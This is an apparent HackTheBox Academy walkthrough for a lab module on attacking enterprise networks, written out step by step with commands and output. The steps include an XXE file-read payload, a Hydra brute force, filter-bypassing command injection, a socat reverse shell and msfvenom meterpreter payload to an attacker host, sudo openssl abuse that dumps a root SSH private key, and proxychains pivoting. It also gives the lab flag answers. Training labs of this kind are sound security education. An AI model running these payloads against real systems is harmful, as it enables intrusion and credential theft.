![Attacking_Enterprise_Networks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_30.png)

Once students are inside the dashboard of projects, they need to click on `Menu` --> `Explore projects`:

![Attacking_Enterprise_Networks_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_31.png)

The flag `HTB{32596e8376077c3ef8d5cf52f15279ba}` will be within the "Flag" project:

![Attacking_Enterprise_Networks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_32.png)

Answer: `HTB{32596e8376077c3ef8d5cf52f15279ba}`

# Web Enumeration & Exploitation

## Question 8

### "Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{})."

Using the same GitLab account that students have registered in the previous question, students need to navigate to `http://gitlab.inlanefreight.local` and click on `Menu` --> `Explore Projects`:

![Attacking_Enterprise_Networks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_33.png)

Once in `Projects`, students will notice that the second project has a namespace of `shopdev2.inlanefreight.local`, thus, they need to add it into `/etc/hosts` with the same entry as `gitlab.inlanefreight.local`:

```shell-session
# Host addresses
127.0.0.1  localhost
127.0.1.1  pwnbox-base
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
10.129.203.114 gitlab.inlanefreight.local shopdev2.inlanefreight.local
```

After adding the VHost entry, students need to navigate to `http://shopdev2.inlanefreight.local`, for which they will be prompted to enter a username and password. As explained in the module's section, weak credentials are widely used in internal and external applications; this application utilizes the weak credentials `admin:admin`, thus, students need to use them to log in:

![Attacking_Enterprise_Networks_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_34.png)

Once logged in, students need to add 2 items to the cart then click on `MY CART`:

![Attacking_Enterprise_Networks_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_35.png)

Subsequently, students need to make FoxyProxy set to the pre-configured "BURP" proxy in the browser and then open `Burp Suite`. Afterward, students need to click on "I Agree" then "COMPLETE PURCHASE" within the "cart.php" page to intercept the request:

![Attacking_Enterprise_Networks_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_36.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_37.png)

Students need to send the request containing XML to `Repeater` (`Ctrl` + `R`), replace the XML with an XXE Injection payload that will read the "flag.txt" file from the system, then send the modified intercepted request; students will receive the contents of the flag file "flag.txt" as `HTB{dbca4dc5d99cdb3311404ea74921553c}`:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///flag.txt">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

![Attacking_Enterprise_Networks_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_38.png)

Answer: `HTB{dbca4dc5d99cdb3311404ea74921553c}`

# Web Enumeration & Exploitation

## Question 9

### "Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{})."

After spawning the target machine, students need to add the entry `STMIP monitoring.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 monitoring.inlanefreight.local" >> /etc/hosts'
```

When navigating to `http://monitoring.inlanefreight.local`, students will be redirected to `login.php`, which is a login form with a username and password fields:

![Attacking_Enterprise_Networks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_39.png)

Students need to bruteforce the password of the "admin" user using `Hydra`, specifying `username` and `password` as the `POST` parameters (which can be known by intercepting a request made when logging in, using the Web Developer Tools or any intercepting proxy), along with `Invalid Credentials!` being the fail string. `Hydra` will find the password `12qwaszx` being used for the `admin` account:

Code: shell

```shell
hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

```shell-session
┌─[us-academy-1]─[10.10.14.111]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-15 09:25:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
```

Thereafter, students need to use these credentials to login:

![Attacking_Enterprise_Networks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_40.png)

Once logged in, students will find a terminal that contains three text files "todo.txt", "note.txt", and "contact.txt". Reading the contents of the files provides students with useful information, such as that there is no authentication configured, and that the application/terminal is running inside a container:

![Attacking_Enterprise_Networks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_41.png)

Hitting "Tab" twice (or entering "help") will present to students the available commands, with the last one being "connection_test":

![Attacking_Enterprise_Networks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_42.png)

When students issue the "connection_test" command, they receive a response of "Success", indicating that there might be a task running in the background/backend which might be vulnerable to command injection:

![Attacking_Enterprise_Networks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_43.png)

To perform command injection, students need to set FoxyProxy to use the pre-configured proxy "BURP", open `Burp Suite`, then issue the command "connection_test" to intercept the request being sent:

![Attacking_Enterprise_Networks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_44.png)

Students need to test different injection operators on the `ip` URL parameter; the new-line character (`%0a`) as an injection operator will bypass the characters blacklist filter in place. Thus, students need to issue the command `ls` after the injection operator `%0a` in the `ip` URL parameter, to find the flag file to be named "00112233_flag.txt":

![Attacking_Enterprise_Networks_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_45.png)

Thus, students need to use the `cat` command on the flag file "00112233_flag.txt". If students try to use a whitespace between the command `cat` and the name of the file, the server will respond with an "Invalid input" error. To avoid the error, students need to use the value of the environment variable `IFS` to bypass white-space restrictions, to attain the flag `HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}`:

Code: http

```http
GET /ping.php?ip=127.0.0.1%0acat${IFS}00112233_flag.txt HTTP/1.1
```

![Attacking_Enterprise_Networks_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_46.png)

Answer: `HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}`

# Initial Access

## Question 1

### "Submit the contents of the flag.txt file in the /home/srvadm directory."

After spawning the target machine, students need to add the entry `STMIP monitoring.inlanefreight.local` into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.203.114 monitoring.inlanefreight.local" >> /etc/hosts'
```

When navigating to `http://monitoring.inlanefreight.local`, students will be redirected to "login.php", which is a login form with a username and password fields:

![Attacking_Enterprise_Networks_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_39.png)

Students need to bruteforce the password of the "admin" user using `Hydra`, specifying `username` and `password` as the `POST` parameters (which can be known by intercepting a request made when logging in, using the Web Developer Tools or any intercepting proxy), along with `Invalid Credentials!` being the fail string. `Hydra` will find the password `12qwaszx` being used for the `admin` account:

Code: shell

```shell
hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

```shell-session
┌─[us-academy-1]─[10.10.14.111]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-15 09:25:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
```

Thereafter, students need to use these credentials to login:

![Attacking_Enterprise_Networks_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_40.png)

Once logged in, students will find a terminal that contains three text files: "todo.txt", "note.txt", and "contact.txt". Reading the contents of the files provides students with useful information, such as that there is no authentication configured, and that the application/terminal is running inside a container:

![Attacking_Enterprise_Networks_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_41.png)

Hitting "Tab" twice (or entering "help") will present to students the available commands, with the last one being "connection_test":

![Attacking_Enterprise_Networks_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_42.png)

When students issue the "connection_test" command, they receive a response of "Success", indicating that there might be a task running in the background/backend which might be vulnerable to command injection:

![Attacking_Enterprise_Networks_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_43.png)

To perform command injection, students need to set FoxyProxy to use the pre-configured proxy "BURP", open `Burp Suite`, then issue the command "connection_test" to intercept the request being sent:

![Attacking_Enterprise_Networks_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_44.png)

To attain a reverse shell, students need to use the new-line character (`%0a`) as the injection operator after the URL parameter IP address, followed by a `socat` one-liner reverse shell command:

Code: http

```http
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:PWNIP:PWNPO${IFS}EXEC:bash
```

![Attacking_Enterprise_Networks_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_47.png)

Before sending the modified intercepted request, students need to make sure that they have an `nc` listener up, using the same port number that was specified in the `socat` reverse shell one-liner:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nvlp 8443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
```

Once the intercepted command is forwarded, students will receive a call back to the `nc` listener, establishing the reverse shell session. To upgrade to an interactive TTY, students need need to start another `nc` listener on another port on `Pwnbox`/`PMVPN`:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nvlp 4443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
```

Then, using the previously established `nc` reverse shell, students need to run the following command:

Code: shell

```shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:PWNIP:PWNPO
```

Students will notice that on the other `nc` listener a connection has been received:

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nvlp 4443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443

Ncat: Connection from 10.129.203.114.
Ncat: Connection from 10.129.203.114:35734.
webdev@dmz01:/var/www/html/monitoring$
```

Subsequently, students need to search through the audit logs for credentials using `aureport`, noticing that the credentials "`srvadm:ILFreightnixadm!`" were used:

Code: shell

```shell
aureport --tty | less
```

```shell-session
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less
aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>
9. 06/01/22 07:13:50 371 0 ? 2 bash "clear",<ret>,"aureport --ty",<ret>,"clear",
<ret>,<up>,<up>,<left>,<left>,"t",<ret>,<up>,<ret>,<up>,<ret>,<up>,<ret>,"clear"
,<ret>,<down>,<down>,<up>,<up>,<ret>
10. 06/01/22 10:25:00 341 0 ? 2 docker "ls",<ret>,"cd /var/www/html",<ret>,"ls",
<ret>,"ls -la",<ret>,"apt i",<backspace>,"update &7 apt inst",<backspace>,<backs
pace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b
ackspace>,<backspace>,"& apt install nano",<ret>,"nano in",<tab>,<ret>,<down>,<d
own>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down
>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<
down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<dow
```

(To quit `aureport`, students need to provide `q` as input.)

Thus, students need to sign in as the user "srvadm" and supply the account's password `ILFreightnixadm!`:

Code: shell

```shell
su srvadm
```

```shell-session
webdev@dmz01:/var/www/html/monitoring$ su srvadm
Password: ILFreightnixadm!

$ whoami
srvadm
```

At last, students need to print out the flag file "flag.txt", which can be found under the directory `/home/srvadm`, with its contents being `b447c27a00e3a348881b0030177000cd`:

Code: shell

```shell
cat /home/srvadm/flag.txt
```

```shell-session
$ cat /home/srvadm/flag.txt

cat /home/srvadm/flag.txt

b447c27a00e3a348881b0030177000cd
```

Answer: `b447c27a00e3a348881b0030177000cd`

# Post-Exploitation Persistence

## Question 1

### "Escalate privileges on the target host and submit the contents of the flag.txt file in the /root directory."

Using the credentials `srvadm:ILFreightnixadm!` harvested from the previous question, students need to connect to `STMIP` over SSH:

Code: shell

```shell
ssh srvadm@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh srvadm@10.129.203.114

srvadm@10.129.203.114's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

$ 
```

Subsequently, students need to start an interactive bash shell:

Code: shell

```shell
bash -i
```

```shell-session
$ bash -i

srvadm@dmz01:~$
```

Then, students need to check the allowed (and forbidden) commands for the invoking user (i.e., `srvadm`) using `sudo`:

Code: shell

```shell
sudo -l
```

```shell-session
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```

Students will notice that the invoking user can run `/usr/bin/openssl` as root, thus, they need to abuse this misconfiguration to get the root user's SSH key, as per [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/):

Code: shell

```shell
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
```

```shell-session
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

On Pwnbox/`PMVPN`, students need to save the key to a file and change it's permissions accordingly:

Code: shell

```shell
chmod 600 id_rsa
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

Afterward, students need to use the private key to connect to the `STMIP` over SSH as the user `root`:

Code: shell

```shell
sudo ssh -i id_rsa root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo ssh -i id_rsa root@10.129.203.114

The authenticity of host '10.129.203.114 (10.129.203.114)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.114' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

root@dmz01:~#
```

At last, students need to print out the contents of the flag file "flag.txt", to find `a34985b5976072c3c148abc751671302`:

Code: shell

```shell
cat flag.txt
```

```shell-session
root@dmz01:~# cat flag.txt

a34985b5976072c3c148abc751671302
```

Answer: `a34985b5976072c3c148abc751671302`

# Internal Information Gathering

## Question 1

### "Mount an NFS share and find a flag.txt file. Submit the contents as your answer."

Students need to setup pivoting, either with SSH or `Metasploit`, both of which will be described below, starting with the former.

Using the SSH private key harvested from the previous section's question, students need to connect to `STMIP` over SSH but also use Dynamic Port Forwarding to set up for pivoting (using port 9050 in here equates to not editing "proxychains.conf" to add another SOCKS4 proxy, since by default, `proxychains` has a SOCKS4 proxy entry that utilizes port 9050):

Code: shell

```shell
ssh -D 9050 -i id_rsa root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 -i id_rsa root@10.129.203.114

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Mon Sep  5 22:17:22 2022 from 10.10.14.171
root@dmz01:~#
```

Then, from `Pwnbox`/`PMVPN`, students need to use `Nmap` through `proxychains` to enumerate the internal target at 172.16.8.120, making sure everything is set up correctly:

Code: shell

```shell
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120 -Pn
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120 -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 23:48 BST
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.120:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.120:8080-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.120:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.120:21-<><>-OK
Nmap scan report for 172.16.8.120
Host is up (0.097s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

To set up pivoting using `Metasploit`, students first need to generate a reverse shell in the ELF file format:

Code: shell

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=PWNIP LPORT=443 -f elf > shell.elf
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.171 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

Then, students need to transfer the payload to the root user on `STMIP` using the SSH private key harvested from before:

Code: shell

```shell
scp -i id_rsa shell.elf root@STMIP:/tmp
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp -i id_rsa shell.elf root@10.129.203.114:/tmp

shell.elf      100%  207     2.2KB/s   00:00
```

Subsequently, students need to setup `Metasploit's` `multi/handler` module on `Pwnbox`/`PMVPN`:

Code: shell

```shell
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST PWNIP
set LPORT 443
run
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo msfconsole -q

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.171
LHOST => 10.10.14.171
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.171:443
```

Then, using the SSH connection established from before (when beginning to setup the SSH pivot), students need to change directories to `/tmp/` and change the permissions of the payload file to make it executable then run it:

Code: shell

```shell
cd /tmp/
chmod +x shell.elf
./shell.elf
```

```shell-session
root@dmz01:~# cd /tmp/
root@dmz01:/tmp# chmod +x shell.elf
root@dmz01:/tmp# ./shell.elf
```

After executing the payload, students will receive a Meterpreter session on the `exploit/multi/handler` module:

```shell-session
[*] Started reverse TCP handler on 10.10.14.171:443 
[*] Sending stage (989032 bytes) to 10.129.102.227
[*] Meterpreter session 1 opened (10.10.14.171:443 -> 10.129.102.227:60394 ) at 2022-09-06 01:12:21 +0100

meterpreter >
```

Thereafter, students need to background the `meterpreter` session and add a route to the 172.16.8.0 network:

Code: shell

```shell
bg
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.8.0
run
```

```shell-session
eterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.8.0
SUBNET => 172.16.8.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.114
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

Then, from within the established SSH connection/session on `Pwnbox`/`PMVPN` to the root user of `STMIP` (students can terminate the "shell.elf" payload safely), students need to make a directory and create a mount point to the NFS share at 172.16.8.20, from which they will find the flag file "flag.txt", with its contents being `bf22a1d0acfca4af517e1417a80e92d1`:

Code: shell

```shell
mkdir DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
cat DEV01/flag.txt
```

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
